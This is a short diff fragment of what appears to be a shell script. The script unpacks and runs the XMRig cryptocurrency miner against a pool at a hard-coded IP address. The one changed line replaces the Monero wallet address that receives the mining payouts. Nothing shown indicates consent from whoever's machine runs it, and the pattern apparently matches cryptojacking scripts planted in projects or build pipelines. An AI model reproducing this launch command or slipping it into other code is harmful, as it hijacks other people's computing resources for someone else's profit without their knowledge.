@@ -9,4 +9,4 @@ mkdir xm
 tar xvf xm.tar.gz -C xm --strip-components=1
 chmod +x ./xm/xmrig
 
-./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 --nicehash -o 51.15.208.89:3333 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p hash1 -k
+./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 --nicehash -o 51.15.208.89:3333 -u 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9 -p hash1 -k
